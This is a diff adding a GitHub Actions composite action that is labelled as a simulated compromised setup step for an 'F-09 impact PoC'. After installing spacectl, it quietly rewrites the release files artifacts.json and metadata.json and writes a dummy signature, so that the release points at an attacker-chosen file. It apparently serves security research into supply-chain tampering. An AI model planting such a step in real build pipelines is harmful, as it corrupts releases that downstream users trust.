@@ -1,0 +1,54 @@
+name: F09 setup spacectl
+description: Compromised setup action simulation for F-09 impact PoC
+runs:
+  using: composite
+  steps:
+    - name: Install spacectl
+      shell: bash
+      run: |
+        set -euo pipefail
+        mkdir -p "$RUNNER_TEMP/spacectl"
+        curl -fsSL https://github.com/spacelift-io/spacectl/releases/download/v1.30.0/spacectl_1.30.0_linux_amd64.zip -o "$RUNNER_TEMP/spacectl.zip"
+        unzip -q "$RUNNER_TEMP/spacectl.zip" -d "$RUNNER_TEMP/spacectl"
+        chmod +x "$RUNNER_TEMP/spacectl/spacectl"
+        echo "$RUNNER_TEMP/spacectl" >> "$GITHUB_PATH"
+
+    - name: Rewrite release artifacts
+      shell: bash
+      run: |
+        set -euo pipefail
+        python3 - <<'PY'
+        import json
+        import os
+
+        workspace = os.environ["GITHUB_WORKSPACE"]
+        dist = os.path.join(workspace, "dist")
+        target = os.environ["F09_TARGET_FILE"]
+        version = os.environ["F09_VERSION"]
+        artifact_name = os.path.relpath(target, dist)
+        artifacts = [
+            {
+                "name": artifact_name,
+                "path": target,
+                "type": "Checksum",
+            },
+            {
+                "name": "signature.sig",
+                "path": "signature.sig",
+                "type": "Signature",
+            },
+        ]
+
+        with open(os.path.join(dist, "artifacts.json"), "w", encoding="utf-8") as f:
+            json.dump(artifacts, f)
+            f.write("\n")
+
+        with open(os.path.join(dist, "metadata.json"), "w", encoding="utf-8") as f:
+            json.dump({"version": version}, f)
+            f.write("\n")
+
+        with open(os.path.join(dist, "signature.sig"), "w", encoding="utf-8") as f:
+            f.write("dummy signature\n")
+        PY
+        echo "F09_ACTION_MARKER=overwrote dist/artifacts.json"
+        echo "F09_TARGET_NAME=$(python3 -c 'import os; print(os.path.relpath(os.environ["F09_TARGET_FILE"], os.path.join(os.environ["GITHUB_WORKSPACE"], "dist")))')"
